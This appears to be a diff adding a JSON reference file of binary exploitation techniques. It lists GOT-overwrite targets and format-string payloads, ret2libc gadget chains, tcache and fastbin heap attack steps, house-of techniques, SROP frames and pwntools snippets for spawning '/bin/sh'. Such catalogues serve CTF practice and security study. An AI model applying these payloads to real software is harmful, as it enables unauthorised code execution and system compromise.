@@ -1,0 +1,162 @@
+{
+  "got_overwrite": {
+    "partial_relro_targets": [
+      {
+        "function": "puts",
+        "typical_got_offset": 4210712,
+        "replacement": "system"
+      },
+      {
+        "function": "printf",
+        "typical_got_offset": 4210720,
+        "replacement": "system"
+      },
+      {
+        "function": "atoi",
+        "typical_got_offset": 4210728,
+        "replacement": "system"
+      },
+      {
+        "function": "exit",
+        "typical_got_offset": 4210736,
+        "replacement": "main"
+      }
+    ],
+    "write_techniques": {
+      "format_string": "%{value}c%{offset}$n",
+      "buffer_overflow_rop": "overflow + write gadget chain",
+      "arbitrary_write": "use write-what-where primitive"
+    },
+    "payload_examples": {
+      "single_byte_overwrite": "%256c%10$hhn",
+      "short_overwrite": "%32768c%10$hn",
+      "full_overwrite": "%134520900c%10$n"
+    },
+    "example_scenario": {
+      "target": "puts@GOT",
+      "replace_with": "system",
+      "trigger": "puts('/bin/sh') becomes system('/bin/sh')",
+      "constraints": [
+        "Partial RELRO only",
+        "Need libc leak",
+        "Need format string or write primitive"
+      ]
+    }
+  },
+  "ret2libc": {
+    "leak_targets": [
+      {
+        "symbol": "puts",
+        "purpose": "leak libc base"
+      },
+      {
+        "symbol": "__libc_start_main",
+        "purpose": "leak libc base"
+      },
+      {
+        "symbol": "printf",
+        "purpose": "leak libc base"
+      }
+    ],
+    "gadget_chains": {
+      "x64_ret2libc": [
+        "pop rdi; ret",
+        "&'/bin/sh'",
+        "system@libc"
+      ],
+      "x86_ret2libc": [
+        "system@libc",
+        "exit@libc",
+        "&'/bin/sh'"
+      ]
+    },
+    "one_gadget_constraints": [
+      "[rsp+0x30] == NULL",
+      "[rsp+0x50] == NULL",
+      "[rsp+0x70] == NULL"
+    ]
+  },
+  "heap_exploitation": {
+    "tcache_poisoning": {
+      "glibc_version": ">= 2.26",
+      "technique": "overwrite tcache->next pointer",
+      "constraints": "no size checks before 2.29",
+      "payload_structure": "fake_chunk_addr in freed tcache bin",
+      "steps": [
+        "1. Allocate chunk A",
+        "2. Free chunk A (goes to tcache)",
+        "3. UAF to overwrite A->next = target_addr",
+        "4. Allocate twice: first returns A, second returns target_addr"
+      ]
+    },
+    "fastbin_attack": {
+      "size_classes": [
+        32,
+        48,
+        64,
+        80,
+        96,
+        112,
+        128
+      ],
+      "technique": "fastbin dup or arbitrary alloc",
+      "payload": "double free or size mismatch",
+      "steps": [
+        "1. free(A) -> free(B) -> free(A) [double free]",
+        "2. Fastbin: A -> B -> A",
+        "3. Allocate 3 times to get arbitrary write"
+      ]
+    },
+    "use_after_free": {
+      "pattern": "alloc -> free -> use",
+      "exploitation": [
+        "overwrite freed chunk metadata",
+        "leak heap/libc addresses",
+        "control vtable pointer"
+      ]
+    },
+    "house_techniques": {
+      "house_of_force": {
+        "description": "overwrite top chunk size to -1",
+        "effect": "malloc can return arbitrary address"
+      },
+      "house_of_spirit": {
+        "description": "fake chunk on stack",
+        "effect": "free stack address, then malloc returns it"
+      },
+      "house_of_orange": {
+        "description": "FILE structure exploit",
+        "effect": "hijack _IO_list_all for code execution"
+      }
+    }
+  },
+  "srop": {
+    "sigreturn_frame": {
+      "rax": 15,
+      "rdi": 0,
+      "rsi": 0,
+      "rdx": 0,
+      "rip": "syscall_gadget",
+      "rsp": "new_stack"
+    },
+    "requirements": [
+      "syscall gadget",
+      "control of rax = 15",
+      "ability to write sigreturn frame (248 bytes on x64)"
+    ],
+    "pwntools_usage": "frame = SigreturnFrame(); frame.rax = 0x3b; frame.rdi = binsh_addr; ..."
+  },
+  "ret2dlresolve": {
+    "requirements": {
+      "relro": "Partial RELRO",
+      "pie": "Disabled (or leaked)",
+      "writable_memory": ".bss or stack"
+    },
+    "fake_structures": {
+      "link_map": "fake DT_STRTAB, DT_SYMTAB, DT_JMPREL",
+      "Elf64_Sym": "fake symbol entry",
+      "rel_offset": "fake relocation entry"
+    },
+    "pwntools_helper": "dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])"
+  }
+}
